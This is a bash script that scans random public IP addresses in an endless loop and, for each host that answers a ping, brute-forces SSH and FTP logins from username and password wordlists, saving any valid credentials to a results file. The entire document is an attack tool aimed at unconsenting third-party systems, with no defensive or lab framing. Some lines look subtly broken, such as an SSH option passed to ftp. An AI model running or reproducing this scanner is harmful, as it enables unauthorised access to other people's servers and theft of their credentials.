#!/bin/bash

RESULTS_FILE="results.txt"
SSH_PORT=22
FTP_PORT=21
SLEEP_TIME=1 #Delay
USERNAME_WORDLIST="path/to/usernames.txt"
PASSWORD_WORDLIST="path/to/passwords.txt"

generate_random_octet() {
  echo $((RANDOM % 256))
}

generate_random_ip() {
  echo "$(generate_random_octet).$(generate_random_octet).$(generate_random_octet).$(generate_random_octet)"
}

ping_ip() {
  ip=$1
  timeout 1 ping -c 1 $ip > /dev/null 2>&1
}

check_credentials() {
  ip=$1
  username=$2
  password=$3

  #Check SSH credentials
  timeout 1 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o BatchMode=yes $username@$ip -p $SSH_PORT exit > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "Valid SSH credentials found for $username:$password on $ip" >> $RESULTS_FILE
    return
  fi

  #Check FTP credentials
  timeout 1 ftp -n -v -o StrictHostKeyChecking=no $ip $FTP_PORT <<EOF
quote USER $username
quote PASS $password
quit
EOF

  if [ $? -eq 0 ]; then
    echo "Valid FTP credentials found for $username:$password on $ip" >> $RESULTS_FILE
  else
    echo "Invalid credentials for $username:$password on $ip"
  fi
}

while true; do
  random_ip=$(generate_random_ip)
  echo "Pinging $random_ip..."

  if ping_ip $random_ip; then
    echo "Ping successful for $random_ip. Checking SSH or FTP credentials on ports $SSH_PORT and $FTP_PORT..."

    while IFS= read -r username; do
      while IFS= read -r password; do
        check_credentials $random_ip $username $password
      done < "$PASSWORD_WORDLIST"
    done < "$USERNAME_WORDLIST"
  else
    echo "Ping failed for $random_ip"
  fi
  
  sleep $SLEEP_TIME  
done
